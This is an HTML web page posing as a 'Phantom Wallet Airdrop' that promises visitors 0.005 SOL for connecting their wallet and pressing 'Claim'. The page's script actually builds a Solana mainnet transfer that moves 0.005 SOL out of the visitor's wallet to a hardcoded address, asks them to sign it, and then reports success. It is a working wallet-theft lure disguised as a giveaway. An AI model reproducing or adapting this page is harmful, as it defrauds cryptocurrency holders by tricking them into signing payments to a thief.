<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Wallet Airdrop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
        }
        button {
            padding: 15px 25px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #2563eb;
        }
        .message {
            margin-top: 20px;
            font-size: 20px;
            color: green;
        }
        .error {
            color: red;
        }
    </style>
</head>
<body>

    <h1>Phantom Wallet Airdrop</h1>
    <p>اضغط على زر ربط المحفظة ثم على زر "Claim" لاستلام 0.005 SOL.</p>

    <button id="connectButton">ربط المحفظة</button>
    <button id="claimButton" disabled>Claim</button>

    <div id="message" class="message"></div>

    <!-- تحميل مكتبة solana-web3.js من الرابط الأكثر استقرارًا -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>

    <script>
        // التأكد من وجود Phantom في المتصفح
        async function checkPhantom() {
            if (window.solana && window.solana.isPhantom) {
                console.log("Phantom wallet is available.");
            } else {
                alert("يرجى تثبيت محفظة Phantom!");
            }
        }

        // ربط المحفظة
        document.getElementById("connectButton").addEventListener("click", async () => {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const wallet = window.solana;
                    const connected = await wallet.connect();
                    document.getElementById("message").innerHTML = `تم ربط المحفظة بنجاح! عنوان المحفظة: ${wallet.publicKey.toString()}`;
                    document.getElementById("claimButton").disabled = false;  // تمكين زر Claim بعد ربط المحفظة
                } catch (err) {
                    console.error(err);
                    alert("لم تتمكن من ربط المحفظة.");
                }
            }
        });

        // المعاملة (إرسال 0.005 SOL)
        document.getElementById("claimButton").addEventListener("click", async () => {
            if (!window.solana || !window.solana.isPhantom) {
                alert("لم يتم ربط المحفظة.");
                return;
            }

            try {
                const wallet = window.solana;
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                const fromWallet = wallet.publicKey;
                const toAddress = new solanaWeb3.PublicKey("RLnGGMPkVXiQEYKXSDw9TfPAtjvSTLvu5A3yRtTdB5p"); // عنوان المستلم
                const lamports = 5000000; // 0.005 SOL

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: fromWallet,
                        toPubkey: toAddress,
                        lamports: lamports,
                    })
                );

                // توقيع المعاملة من قبل المستخدم
                const signedTransaction = await wallet.signTransaction(transaction);

                // إرسال المعاملة إلى الشبكة
                const txid = await connection.sendRawTransaction(signedTransaction.serialize());

                // التأكد من أن المعاملة تمت
                await connection.confirmTransaction(txid);

                document.getElementById("message").innerHTML = `تمت المعاملة بنجاح! TxID: ${txid}`;
            } catch (error) {
                console.error("فشلت المعاملة:", error);
                document.getElementById("message").innerHTML = `<span class="error">فشلت المعاملة: ${error.message}</span>`;
            }
        });

        // التحقق من وجود Phantom
        checkPhantom();
    </script>

</body></html>